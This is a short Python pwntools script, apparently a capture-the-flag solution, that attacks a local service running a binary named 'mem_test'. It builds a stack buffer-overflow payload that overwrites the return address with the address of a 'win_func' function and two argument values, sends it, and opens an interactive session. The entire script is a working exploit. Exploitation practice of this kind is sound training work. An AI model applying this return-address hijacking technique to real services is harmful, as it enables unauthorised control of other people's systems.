from pwn import * 

exe = context.binary = ELF('mem_test')
io = remote('localhost', 2425)
winaddr = exe.symbols['win_func']
hint1 = 0x0804a021
io.recvuntil("is...")
offset = 19 # offset from start of buff to return address
payload = fit ({
    offset + 4: p32(winaddr),
    offset + 8: p32(hint1),
    offset + 12: p32(hint1)
})
io.recvline()
io.send(payload)
io.interactive()
